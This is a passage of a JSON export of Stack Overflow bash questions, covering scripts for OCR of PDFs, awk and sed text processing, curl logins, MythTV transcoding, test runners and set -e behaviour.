$OUTFILENAME\"\n\n#Logging I/O filenames\necho \"infile: $1\" &gt;&gt; error.log\necho \"outfile: $2\" &gt;&gt; error.log\n\n#If the temporary directory doesn't exist, make it\nif [ ! -d \"$TMPDIR\" ];\nthen\n    mkdir $TMPDIR\nfi\n\n#Check to see that the correct number of params have been passed.\nif [[ $PARAM -lt 2 ]];\nthen\n    echo \"Usage: $0 source.pdf output.pdf\"\n    echo \"output.pdf is the desired output file\"\n    echo \"source.pdf is a file to be OCR'd\"\n    exit 1\nfi\n\n#Make sure the input file is a PDF\nif [ \"${1##*.}\" == \"pdf\" ];\nthen\n    multilayer=false\n\n    #Check to see if the input file is a multi-layered pdf with searchable text\n        if grep -Fl \"Font\" \"$1\"; then multilayer=true; fi\n\n    #If it's not multi-layered, then perform the OCR\n    if [ \"$multilayer\" == \"false\" ];\n    then\n        mkdir $TMPDIR/\"$INFILENAME/\"\n        echo \"making temporary directory $TMPDIR/$INFILENAME\"\n        #Split the PDF into pdf's of one page per df in a temporary directory\n        pdftk \"$1\" burst output \"$TMPDIR/$INFILENAME/pg_%04d.pdf\"\n        echo \"burse output to $TMPDIR/$INFILENAME/pg_%04d.pdf\"\n        mv \"$1\" processed/\n        for files in \"$TMPDIR/$INFILENAME/\"*\n            do\n            echo \"$files\"\n                    filename=$(basename \"$files\")\n                    filename=\"${filename%.*}\"\n\n            #Convert the pdf page into an image\n                    gs -r300 -o \"$TMPDIR/$INFILENAME/$filename.jpeg\" -sDEVICE=jpeg \"$TMPDIR/$INFILENAME/$filename.pdf\"\n\n            #Perform the OCR against the image\n                    tesseract \"$TMPDIR/$INFILENAME/$filename.jpeg\" \"$TMPDIR/$INFILENAME/$filename\" hocr\n\n            #Combine the OCR'd image and OCR'd text into a multi-layer PDF file of that page\n                    hocr2pdf -i \"$TMPDIR/$INFILENAME/$filename.jpeg\" -o \"$TMPDIR/$INFILENAME/$filename.pdf\" &lt; \"$TMPDIR/$INFILENAME/$filename.html\"\n                    compressed=\"$filename-compressed.pdf\"\n\n            #Compress the multi-layered PDF of the page\n                    gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dNOPAUSE -dQUIET -dBATCH -sOutputFile=\"$TMPDIR/$INFILENAME/$compressed $TMPDIR/$INFILENAME/$filename.pdf\"\n                    mv \"$TMPDIR/$INFILENAME/$compressed\" \"$TMPDIR/$INFILENAME/$filename\"\n            done\n\n        #Concatenate all of the multiline PDF pages into a single PDF file\n        pdftk \"$TMPDIR/$INFILENAME/\"*.pdf cat output \"$OUTFILENAME\"\n        compressed=\"$OUTFILENAME-compressed.pdf\"\n\n        #Compress the multi-layered PDF\n        gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dNOPAUSE -dQUIET -dBATCH -sOutputFile=\"$compressed\" \"$OUTFILENAME\"\n        mv \"$compressed\" \"$2\"\n        rm -rf \"$TMPDIR/$INFILENAME\"\n    else\n        echo \"The input file is multi-layered\"\n        mv \"$1\" \"$2\"\n    fi\nelse\n    echo \"Please enter a valid input pdf file\"\n    exit 2\nfi\n</code></pre>\n"},{"tags":["linux","bash","shell","tar"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13041345,"title":"Getting contents of a particular file in the tar archive","body":"<p>This script lists the name of the file ( in a tar archive) containing a pattern.</p>\n\n<pre><code>tar tf myarchive.tar | while read -r FILE\ndo\n    if tar xf test.tar $FILE  -O | grep \"pattern\" ;then\n        echo \"found pattern in : $FILE\"\n    fi\ndone\n</code></pre>\n\n<p>My question is:</p>\n\n<p>Where is this feature documented, where $FILE is one of the files in the archive:</p>\n\n<pre><code>tar xf test.tar $FILE\n</code></pre>\n"},{"tags":["git","bash","unix","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":278,"score":1,"question_id":1787666,"title":"How do I find out what options git-diff uses when it invokes less?","body":"<p>I want to reproduce the pager behavior that git-diff uses but I don't know how. Is there a way I could find out what options it uses with less?</p>\n\n<p>I already tried this: <code>strings \"$(dirname $(which git-diff))/*\" | grep 'less '</code></p>\n\n<p>And this (while less was running): <code>ps aux | grep less</code> &lt;= Didn't show me which options it was using.</p>\n\n<p>I'm on Darwin.</p>\n"},{"tags":["bash","google","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13039891,"title":"Using curl in a bash script, how do I effectively log into Google Voice?","body":"<p>My bash script is doing the following:</p>\n\n<pre><code>curl -k -s -c gv.cookies https://accounts.google.com/ServiceLogin -F Email=something@gmail.com -F Passwd=somepassword -F service=grandcentral\n</code></pre>\n\n<p>This seems to work. The cookies file is created, and if I peruse the output, it certainly thinks that I've logged in.</p>\n\n<p>However, when I next do this:</p>\n\n<pre><code>curl -k -s -b gv.cookies https://www.google.com/voice/\n</code></pre>\n\n<p>I get a \"moved temporarily\" page, and not the Google Voice markup that I expect.</p>\n\n<p>Am I missing some parameter to curl that makes it use the cookies correctly? I don't need it fixed so much as I need someone to point me in the right direction.</p>\n"},{"tags":["python","osx","bash","zip","python-module"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":376,"score":2,"question_id":3760970,"title":"Is there a way to run a python script that is inside a zip file from bash?","body":"<p>I know there is a way to import modules which are in a zip file with python. I created kind of custom python package library in a zip file. </p>\n\n<p>I would like to put as well my \"task\" script in this package, those are using the library. Then, with bash, I would like to call the desired script in the zip file without extracting the zip.</p>\n\n<p>The goal is to have only one zip to move in a specified folder when I want to run my scripts.</p>\n"},{"tags":["linux","bash","find","exec"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13039410,"title":"Find and rename a directory","body":"<p>I am trying to find and rename a directory on a linux system.</p>\n\n<p>the folder name is something like : <code>thefoldername-23423-431321</code></p>\n\n<p><code>thefoldername</code> is consistent but the numbers change every time.</p>\n\n<p>I tried this:</p>\n\n<pre><code>find . -type d -name 'thefoldername*' -exec mv {} newfoldername \\;\n</code></pre>\n\n<p>The command actually works and rename that directory. But I got an error on terminal saying that there is no such file or directory.</p>\n\n<p>How can I fix it?</p>\n"},{"tags":["c","bash","unix","script","stdout"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":13037934,"title":"Simple Bash-C communication","body":"<p>I'm trying to build a script that will respond to a simple C program. I guess the scripts needs to read line by line and parse the text until it finds the question. Then it has to reply to the same stdout. The script reads in at an infinite loop, and i start it on the command line </p>\n\n<pre><code>./script.sh &amp;\n</code></pre>\n\n<p>in order to have it running in the background. Then, in the same terminal, i start my C programm that outputs on the command line and waits at a scanf.\nMy problem is that it looks as if those two processes are interacting with a different stdout since they can't \"see\" eachother. Obviously i have misunderstood something...any help?</p>\n\n<pre><code>#!/bin/bash\nfor (( ; ; )) do\n    while read line; do\n        if [ \"$line\" == \"&gt;\" ] then\n        echo \"yes\"\n        fi\n    done\ndone    \n</code></pre>\n"},{"tags":["bash","file-rename"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13037660,"title":"How to programmatically rename XYZUpperCamelCase files to xyzLowerCamelCase?","body":"<p>I have a great number of files that need <code>svn mv</code>'d, and I'd rather not do it all by hand.</p>\n\n<p>Each file name follows the format <code>XYZSomething.txt</code> or <code>SomethingElse.txt</code>, and should be renamed to <code>xyzSomething.txt</code> and <code>somethingElse.txt</code>, respectively.</p>\n\n<p>If I didn't need to deal with the abbreviation prefix, I could just use something like</p>\n\n<pre><code>for f in *; do svn mv $f ${f,}; done\n</code></pre>\n\n<p>which lowercases just the first character in the filename. As it stands, this gets me 90% of the way, so it wouldn't be too painful to finish it by hand; but I would still like to know how to cover the prefix for future knowledge.</p>\n\n<p>So tell me, great Bash wizards of StackOverflow, what's the best way to rename these files?</p>\n"},{"tags":["bash","file-manipulation","set-difference"],"answer_count":4,"favorite_count":5,"up_vote_count":13,"down_vote_count":0,"view_count":3158,"score":13,"question_id":2509533,"title":"bash, Linux: Set difference between two text files","body":"<p>I have two files <code>A</code>-<code>nodes_to_delete</code> and <code>B</code>-<code>nodes_to_keep</code>. Each file has a many lines with numeric ids.</p>\n\n<p>I want to have the list of numeric ids that are in <code>nodes_to_delete</code> but NOT in <code>nodes_to_keep</code>, e.g. <img src=\"http://mathworld.wolfram.com/images/equations/SetDifference/Inline1.gif\" alt=\"alt text\">.</p>\n\n<p>Doing it within a PostgreSQL database is unreasonably slow. Any neat way to do it in bash using Linux CLI tools?</p>\n\n<p><strong>UPDATE:</strong> This would seem to be a Pythonic job, but the files are really, really large. I have solved some similar problems using <code>uniq</code>, <code>sort</code> and some set theory techniques. This was about two or three orders of magnitude faster than the database equivalents.</p>\n\n<p>Adam</p>\n"},{"tags":["xml","bash","xhtml","shell","xpath"],"answer_count":10,"favorite_count":11,"up_vote_count":33,"down_vote_count":4,"view_count":45527,"score":29,"question_id":893585,"title":"How to parse XML in Bash?","body":"<p>Ideally, what I'd like to be able to do is:</p>\n\n<pre><code>cat xhtmlfile.xhtml |\ngetElementViaXPath --path='/html/head/title' |\nsed -e 's%(^&lt;title&gt;|&lt;/title&gt;$)%%g' &gt; titleOfXHTMLPage.txt\n</code></pre>\n"},{"tags":["c","bash","converter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":97,"score":-1,"question_id":13035005,"title":"Convert Bash Script to C. Is that possible?","body":"<p>I found the following:\n<a href=\"http://www.basic-converter.org/stable/bacon.bash\" rel=\"nofollow\">http://www.basic-converter.org/stable/bacon.bash</a></p>\n\n<p>Is such a way possible to convert from bash to c?</p>\n\n<p>Reason: Is C faster then BASH? I want to run something as a deamon instead of a cron job.</p>\n"},{"tags":["linux","bash","shell","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":76,"score":3,"question_id":13032137,"title":"How can I reduce one of the pipe in the following awk statement","body":"<p><code>ls -lrt | awk ' !/dly/ { print $NF } ' | awk ' /000001.txt.gz/ { print } '</code></p>\n\n<p>I want to display the file names which matches following condition:\n1)Should not contain \"dly\" keyword.\n2)Should contain \"000001.txt.gz\" keyword.</p>\n\n<p>I used the above command. Is it possible to combine 2 pipes I used ?</p>\n"},{"tags":["regex","bash","shell","sed","awk"],"answer_count":6,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":83,"score":6,"question_id":13027807,"title":"Select odd columns, then put fields of consecutive rows together","body":"<p>I have a data file that I need to transform with regular expressions. More specifically, I need to maintain the first 6 columns the same, and from the 7th column on, select only the odd columns, and then put together the fields of each pair of consecutive rows. I know it sounds a bit complicated so I'll clarify this through an example. This is my original data file (it could have any number of columns):</p>\n\n<pre><code>A B C D E F 11 12 13 14 15 16 17 18\nA B C D E F 21 22 23 24 25 26 27 28\nA B C D E F 31 31 33 34 35 36 37 38\nA B C D E F 41 42 43 44 45 46 47 48\nA B C D E F 51 52 53 54 55 56 57 58\nA B C D E F 61 62 63 64 65 66 67 68\nA B C D E F 71 72 73 74 75 76 77 78\nA B C D E F 81 82 83 84 85 86 87 88\n</code></pre>\n\n<p>I figured out I can maintain the 6 first columns and then delete the odd ones with</p>\n\n<pre><code>awk '{for (i = 1; i &lt;= NF; i++) if (i &lt; 7 || i % 2 == 1) printf $i OFS}; {print \"\"}\n</code></pre>\n\n<p>being this the result:</p>\n\n<pre><code>A B C D E F 11 13 15 17 \nA B C D E F 21 23 25 27 \nA B C D E F 31 33 35 37 \nA B C D E F 41 43 45 47 \nA B C D E F 51 53 55 57 \nA B C D E F 61 63 65 67 \nA B C D E F 71 73 75 77 \nA B C D E F 81 83 85 87 \n</code></pre>\n\n<p>But after that I have to put together the fields of each pair of consecutive rows, like this:</p>\n\n<pre><code>A B C D E F 11 21 13 23 15 25 17 27\nA B C D E F 31 41 33 43 35 45 37 47\nA B C D E F 51 61 53 63 55 65 57 67\nA B C D E F 71 81 73 83 75 85 77 87\n</code></pre>\n\n<p>I was thinking of using sed or awk to make the whole process, since my data files are huge and I need to transform them efficiently, but I couldn't figure out a way to do the second transformation too. Any help would be highly appreciated.</p>\n"},{"tags":["linux","osx","bash","terminal"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":13036855,"title":"Adding a line break after PS1","body":"<p>I'm trying to add a line break after my prompt.  Basically I want:</p>\n\n<pre><code>$ ls\n                    &lt;-- how do I get this line break?\nfile1 file2 file3\n                    &lt;-- this one is easy, PS1=\"\\n$ \" or whatnot\n$\n</code></pre>\n\n<p>instead of</p>\n\n<pre><code>$ ls\nfile1 file2 file3\n$\n</code></pre>\n"},{"tags":["bash","sed","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":169,"score":0,"question_id":13023595,"title":"sed/awk - print text between patterns spanned across multiple lines","body":"<p>I am new to scripting and was trying to learn how to extract any text that exists between two different patterns. However, I am still not able to figure out how to extract text between two patterns in the following scenario:</p>\n\n<p>If I have my <strong>input file</strong> reading:</p>\n\n<pre><code>Hi I would like\nto print text\nbetween these \npatterns\n</code></pre>\n\n<p>and my expected <strong>output</strong> is like:</p>\n\n<pre><code>I would like\nto print text\nbetween these \n</code></pre>\n\n<p>i.e. my first search pattern is \"Hi' and skip this pattern, but print everything that exists in the same line following that matched pattern. My second search pattern is \"patterns\" and I would like to completely avoid printing this line or any lines beyond that.</p>\n\n<p>I tried the following:</p>\n\n<pre><code>sed -n '/Hi/,/patterns/p' test.txt \n</code></pre>\n\n<p>[output]</p>\n\n<pre><code>Hi I would like\nto print text\nbetween these \npatterns \n</code></pre>\n\n<p>Next, I tried:</p>\n\n<pre><code>`awk ' /'\"Hi\"'/ {flag=1;next} /'\"pattern\"'/{flag=0} flag { print }'` test.txt \n</code></pre>\n\n<p>[output]</p>\n\n<pre><code>to print text\nbetween these\n</code></pre>\n\n<p>Can someone help me out in identifying how to achieve this?\nThanks in advance</p>\n"},{"tags":["bash","screen"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13035384,"title":"bash screen title usage (screen -t \"something\")","body":"<p>I was working with <code>screen</code> lately and wanted to use the <code>-t</code> option for it. What's the point of the<code>-t</code> option if the title of the screen does not show anywhere like when using <code>-list</code> or within the screen when it's attached?</p>\n\n<p>There is a command <code>CTRL-A double-quote(\")</code> to see all active screens, and then it shows the title, but that does not really do the job, because I have to have the screen attached already. I want to read out the title BEFORE attaching any screens, to attach the right one in the first place.</p>\n\n<p>Is there a method to use <code>-t</code> in a convenient way? </p>\n\n<p>Edit:\nThere is one method: <code>ctrl-a \"</code> and then <code>ctrl-a {numberofscreen}</code>. I guess that's the best way to use the screen titles?</p>\n\n<p>Edit2:\nIt seems I was using screen incorrectly. I mixed up windows with instances of screen. Better usage (for me): use the same screen (with <code>screen -r</code>) and create windows within, which I then can name and list using one of the several methods.\nTo sum it up:\nThe title <code>-t</code> is not the screen title, but the WINDOW title.\nThank you for the discussion!</p>\n\n<p>Edit3:\nI just found out: The names which are shown in <code>screen -list</code> are the Session names. The command would be <code>screen -S \"sessionname\"</code> .</p>\n"},{"tags":["linux","bash","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13033226,"title":"Detect repeated characters using grep","body":"<p>I'm trying to write a grep (or egrep) command that will find and print any lines in \"words.txt\" which contain the same lower-case letter three times in a row. The three occurrences of the letter may appear consecutively (as in \"mooo\") or separated by one or more spaces (as in \"x x x\") but not separated by any other characters.</p>\n\n<p>words.txt contains: </p>\n\n<pre><code>The monster said \"grrr\"!\nHe lived in an igloo only in the winter.\nHe looked like an aardvark.\n</code></pre>\n\n<p>Here's what I think the command should look like:</p>\n\n<pre><code>grep -E '\\b[^ ]*[[:alpha:]]{3}[^ ]*\\b' 'words.txt'\n</code></pre>\n\n<p>Although I know this is wrong, but I don't know enough of the syntax to figure it out. Using grep, could someone please help me? </p>\n"},{"tags":["bash","time","set","posix"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":13032610,"title":"Strange interaction of bash time, set -e and false, differences of bash 3 vs. bash 4","body":"<p>Following recipe to <code>time</code> <code>false</code> under <code>set -e</code> succeeds (success in the sense that the <code>time</code> output can be seen):</p>\n\n<pre><code>(\nset +e\ntime { ( set -e; false; echo no0; ); }\necho yes0 $?\n)\n</code></pre>\n\n<p>But following recipes fail:</p>\n\n<pre><code>(\nset -e\ntime false\necho no1\n)\n</code></pre>\n\n<p>As well:</p>\n\n<pre><code>(\nset -e\ntime { false; echo no2; }\necho no2\n)\n</code></pre>\n\n<p>As well (surprisingly it outputs yes3 under bash3 and nothing under bash4):</p>\n\n<pre><code>(\nset -e\ntime ( false; echo no3; )\necho yes3 $?\n)\n</code></pre>\n\n<p>As well (not very suprising):</p>\n\n<pre><code>(\nset +e\ntime { set -e; false; echo no4; }\necho no4\n)\n</code></pre>\n\n<p>As well (surprise):</p>\n\n<pre><code>(\nset +e\ntime ( set -e; false; echo no5; )\necho yes5 $?\n)\n</code></pre>\n\n<p>And following succeeds under bash3 and does something completely different under bash4:</p>\n\n<pre><code>(\nset -e\ntime { ( false; echo no7; ); echo yes6 $?; }\necho yes6 $?\n)\n</code></pre>\n\n<p>Note that the \"no\" <code>echo</code>es are not printed, while the \"yes\" are output by bash3 (but not all by bash4).</p>\n\n<p>If you compare this with the subshell <code>(...)</code> processing under <code>set -e</code> it looks like the <code>time</code> builtin is executed with the subshell context in the <code>time (...)</code> case.  WTF?</p>\n\n<p>Tested with</p>\n\n<pre><code>GNU bash, version 3.2.25(1)-release (x86_64-redhat-linux-gnu)\nCopyright (C) 2005 Free Software Foundation, Inc.\n</code></pre>\n\n<p>outputs</p>\n\n<pre><code>real    0m0.000s\nuser    0m0.001s\nsys     0m0.000s\nyes0 1\nyes3 1\nyes5 1\nyes6 1\n\nreal    0m0.000s\nuser    0m0.000s\nsys     0m0.001s\nyes6 0\n</code></pre>\n\n<p>and</p>\n\n<pre><code>GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)\nCopyright (C) 2009 Free Software Foundation, Inc.\n</code></pre>\n\n<p>outputs</p>\n\n<pre><code>real    0m0.001s\nuser    0m0.000s\nsys     0m0.004s\nyes0 1\nyes5 1\n</code></pre>\n\n<p>Note that \"yes3\" and \"yes6\" cases show a huge difference in how bash3 and bash4 process <code>set -e</code>.</p>\n\n<p>But the \"yes5\" case is confusing.  It looks like \"time\" somehow is processed by the subshell and not in the outer shell.</p>\n\n<p><strong>Is this behavior enforced by POSIX, is one of the bashs buggy or is it just a <code>bash</code> special behavior?</strong></p>\n\n<p>Thanks ;)</p>\n\n<p>PS: If you are puzzled why this is not academic:  There once was a script running under <code>set -e</code> (\"yes3\" without <code>time</code>).  It was altered to log some timing information, the hack looks like \"yes6\".  But now bash4 comes around and it needes a fix again.</p>\n"},{"tags":["java","bash","redirect","testcase"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":8618306,"title":"how to write simple txt testcases in java","body":"<p>Hi I'm writing my first Java app and I've got a few Testcases (*.tc files) I want to direct to the app via this script:</p>\n\n<pre><code>for f in `ls *.tc`; do\n  echo \"Current Testcase: $f\"\n  x=${f%.*}\n  java Main &lt; $x.tc &gt; $x.out\n\n  if diff \"$x.out\" \"$x.should\"; then\n    echo \"passed testcase $f\"\n    let PASSED=PASSED+1\n  else\n    echo \"failed testcase $f\"\n    let FAILED=FAILED+1\n fi\ndone\n</code></pre>\n\n<p>The Problem is I can't quite figure out why as soon as the <code>tc file</code> contains more than one line the app goes nuts. For example: <code>quit.tc</code> contains</p>\n\n<pre><code>quit\n</code></pre>\n\n<p>and works just like when I manually enter \"quit\", therfore the testcase passes.\nHowever when I write another tc: <code>quit2.tc</code> which contains</p>\n\n<pre><code>lala\ntest\nquit\n</code></pre>\n\n<p>The app quits after the first command (because the readString function seems to return null afterwards).\nHere is the function responsible for reading:</p>\n\n<pre><code>public String readString(){\n\nBufferedReader br = new BufferedReader(new InputStreamReader(System.in));\nString answer = null;\n\ntry {\n  answer = br.readLine();\n  return answer;\n}\ncatch(IOException ioe) {\n  System.out.println(\"IO Error\");\n}\nreturn answer;\n}   \n</code></pre>\n\n<p>I dont know why or when this function returns null when I redirect to the app, which seems to be the problem. Can you help out so I can get the tc script working? thx</p>\n"},{"tags":["bash","variables","hyperlink","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":13000582,"title":"bash script gives error with mv ... probably easy fix","body":"<p>EDIT: the fixnames.sh called at the end is probably generating the error (particularly line 2):</p>\n\n<pre><code>    #/bin/bash\n    for x in *\\'*;\n    do\n    y=$(echo \"$x\"| sed y/\\'\\,/__/)\n    mv \"$x\" \"$y\"\n    done\n</code></pre>\n\n<p>The problem line is the mv command at the end</p>\n\n<pre><code>    mv $OUTDIR/$OLD $OUTDIR/$NEW\n</code></pre>\n\n<p>It errors with something like:</p>\n\n<pre><code>    mv '*\\* [something about unable to stat this]\n</code></pre>\n\n<p>This script was something I customized from one that had been posted here <a href=\"http://www.mythtv.org/wiki/Removing_Commercials\" rel=\"nofollow\">http://www.mythtv.org/wiki/Removing_Commercials</a> and some other places.  The goal of the mv was, iirc, to clean up the tmp directory (removing a symbolic link that I clunkily used to do a rename of the file).  I'm a little unclear on what is happening in that mv line and the 2 lines prior that is apparently causing the script not to finish cleanly.  Thanks for any input.</p>\n\n<pre><code>    #!/bin/sh\n    VIDEODIR=$1\n    FILENAME=$2\n    CHANID=$3\n    STARTTIME=$4\n    # MythTV Install Prefix\n    INSTALLPREFIX=\"/usr/bin\"\n    USRLOCALPREFIX=\"/usr/local/bin\"\n    HOMEDIR=\"/home/xxx\"\n    OUTDIR=\"/home/xxx/trans-out\"\n    TMPDIR=\"/home/xxx/trans-out/tmp\"\n\n    if [ ! -d $TMPDIR ]; then mkdir $TMPDIR; fi\n    rm -f $TMPDIR/*\n\n    # Sanity checking, to make sure everything is in order.\n    if [ -z \"$VIDEODIR\" -o -z \"$FILENAME\" -o -z \"$CHANID\" -o -z \"$STARTTIME\" ]; then\n            echo \"Usage: $0 &lt;VideoDirectory&gt; &lt;FileName&gt; &lt;CHANID&gt; &lt;STARTTIME&gt;\"\n            exit 5\n    fi\n    if [ ! -f \"$VIDEODIR/$FILENAME\" ]; then\n            echo \"File does not exist: $VIDEODIR/$FILENAME\"\n            exit 6\n    fi\n    # The meat of the script. Flag commercials, copy the flagged commercials to\n    # the cutlist, and transcode the video to remove the commercials from the\n    # file.\n\n    $INSTALLPREFIX/mythtranscode --chanid $CHANID --starttime $STARTTIME --mpeg2 --honorcutlist --showprogress -o $OUTDIR/$FILENAME.tmp\n    ERROR=$?\n    if [ $ERROR -ne 0 ]; then\n            echo \"Transcoding failed for ${FILENAME} with error $ERROR\"\n            exit $ERROR\n    fi\n\n    # use mythlink script to extract program information from database and make link in tmp subfolder for renaming of transcoded version.\n    $USRLOCALPREFIX/mythlink.pl --link $TMPDIR --chanid $CHANID --starttime $STARTTIME --underscores --separator _ --format %T_%oY%om%od_%S\n\n    # remove the map file since we are transcoding\n    rm -f $OUTDIR/$FILENAME.tmp.map\n\n    # set variables for newfilename-link and oldfilename-transcoded file and then to rename transcoded with link name\n    NEW=$(ls $TMPDIR)\n    OLD=$(ls $OUTDIR | grep -i \"mpg.tmp\" | awk '{ print $1; }')\n    mv $OUTDIR/$OLD $OUTDIR/$NEW\n\n    # remove commas and apostraphies\n    cd $OUTDIR &amp;&amp; $USRLOCALPREFIX/fixnames.sh\n</code></pre>\n"}]}
{"total":16352,"page":7,"pagesize":100,"questions":[{"tags":["bash","read-file"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13030940,"title":"bash: read stdin line by line with custom line delimiter","body":"<p>I have a bash script that reads lines from stdin.</p>\n\n<pre><code>while read var\ndo\n    echo $var\ndone\n</code></pre>\n\n<p>Now, I have to modify this so I could accept input with line delimiter \"EndOfMessage\" (delimiter of several symbols).</p>\n\n<p>How could I do that?</p>\n"},{"tags":["python","bash","googletest"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":13021941,"title":"seg fault when called from python, but runs normally from the command line","body":"<p>I am writing a python script that is used for continuous integration and test that will be called by bitten.  Our unit tests use the google test framework.  Each software component has a bash script that runs configuration and other required services and runs the gtest executable.  The python script walks the repository looking for the bash scripts, and calls each script using the os.popen() command. </p>\n\n<p>Python script (UnitTest.py)</p>\n\n<pre><code>#!/usr/bin/python\n\nimport os\nimport fnmatch\nimport sys\nimport subprocess\n\nrepository_location = '/home/actuv/workspace/eclipse/iccs/'\nunit_test_script_name = 'RunUnitTests.sh'\n\ndef file_locator(repo, script_name):\n    # Function for determining all unit test scripts\n    test_location = []\n    for root, dirnames, filenames in os.walk(repo):\n        for filename in fnmatch.filter(filenames, script_name):\n            test_location.append(os.path.join(root))\n    return test_location\n\ndef run_tests(test_locations, script_name):\n    # Runs test scripts located at each test location\n    for tests in test_locations:\n        cmd = 'cd ' + tests + ';./' + script_name\n        print 'Running Unit Test at: ' + tests\n        os.popen(cmd)\n\n################    MAIN    ################\n# Find Test Locations\nscript_locations = file_locator(repository_location, unit_test_script_name)\n\n# Run tests located at each location\nrun_tests(script_locations)\n\n# End of tests\nsys.exit(0)\n</code></pre>\n\n<p>Bash Script</p>\n\n<pre><code>#!/bin/sh\n\necho \"Running unit tests...\"\n\n# update the LD_LIBRARY_PATH to include paths to our shared libraries\n#export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:XYZ\n\n# start the test server\ncd ../../TestServerComponent/test\n../build/app/src/TestServerComponent&amp;\nSERVERPID=$(echo $!)\ncd ../../TestClientComponent/test \nTESTDIR=$PWD\n\n# Run the single client tests\ncd SingleClientTests\n../../build/test/SingleClientTests/TestSingleClient --gtest_output=\"xml:gtest-ACSC.xml\"\n\n#run the multiclient tests\ncd $TESTDIR\ncd MultiClientTests/HighAuthorityClient\n../../../build/test/MultiClientTests/HighAuthorityClient/TestMultiClientHA&amp;\nHIGHPID=$(echo $!)\ncd $TESTDIR\ncd MultiClientTests/LowAuthorityClient\n../../../build/test/MultiClientTests/LowAuthorityClient/TestMultiClientLA --gtest_output=\"xml:gtest-ACMC.xml\"\n\n# wait to allow all processes to end before terminating the server\nsleep 10s\n\necho 'Send Term signal to: ' $SERVERPID\nkill -2 $SERVERPID\n</code></pre>\n\n<p>When I run the bash script manually from a terminal window, it runs fine.  When I have the python script call the bash script I get a segmentation fault on the TestSingleClient and TestMultiClientLA lines of the bash script.</p>\n"},{"tags":["python","bash","shell","script"],"answer_count":4,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":469,"score":9,"question_id":4407843,"title":"sending password to command line tools","body":"<p>i'm writing a python application that uses a command line utility (propietary so it can't be modified) to do part of its work. The problem is that I have to pass the password as a command line argument to the tool which would easily be seen by any user doing 'ps ax'. How can I send the password to the command line tool safely from within python (or a shell script)?</p>\n"},{"tags":["linux","bash","find"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13033832,"title":"Find files with a certain extension that exceeds a certain file size","body":"<p>I'm having trouble with the find command in bash.\nI'm trying to find a file that ends with .c and has a file size bigger than 2000 bytes. I thought it would be:</p>\n\n<pre><code>find $HOME -type f -size +2000c .c$\n</code></pre>\n\n<p>But obviously that isn't correct.</p>\n\n<p>What am I doing wrong? </p>\n"},{"tags":["bash","curl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3399,"score":0,"question_id":8922061,"title":"Bash - Curl (6) couldn't resolve host issue","body":"<p>I am having a problem with my bash script. It is producing an error of </p>\n\n<p><code>curl (6) couldn't resolve host</code></p>\n\n<p>What have I done wrong?</p>\n\n<p>The following is my bash script.</p>\n\n<pre><code>#!/bin/bash\n\nstring=\"$(mysql -u root -p Company 'select name from HR')\"\nurl=\"http://www.company.com/company/hr/$string\"\n\ncurl -F $url\n</code></pre>\n"},{"tags":["osx","bash","shell","find"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":51,"score":-1,"question_id":13030445,"title":"Bash - Strange behavior when assigning `find` result to variable","body":"<p>I am attempting to do some simple directory mangling via a bash script, but I am encountering some odd behavior (OSX 10.6).</p>\n\n<p>When I issue the following command within the target directory, I get the expected results from the <code>find</code> command when attempting to search for just directories/folders, ie:</p>\n\n<pre><code>find . -iname \"*\" -type d\n\nResults:\ndir1\ndir2\ndir3\n</code></pre>\n\n<p>However, when I attempt to assign the results to a variable and print it, I get some very different behavior:</p>\n\n<pre><code>myvar=$(find . -iname \"*\" -type d)\necho $myvar\n\nResults:\ndir1\ndir2\ndir3\ndir3\ndir3\ndir3\n</code></pre>\n\n<p>Does it make sense that the final entry is repeated multiple times? I am able to remedy this via piping the output to <code>sort -u</code> for now, but I wanted to know the root cause of this issue.</p>\n\n<p>Thank you.</p>\n"},{"tags":["iphone","ios","xcode","bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13034232,"title":"How do I create a Build Phase script to set CFBundleVersion to SVN Revision number?","body":"<p>I've seen some other questions on here that touch upon creating bash scripts to update version and build numbers in Xcode, but I haven't been able to find one that successfully updates the CFBundleVersion to the SVN revision number each time I do a build.</p>\n\n<p>Does anyone have a script that I might be able to 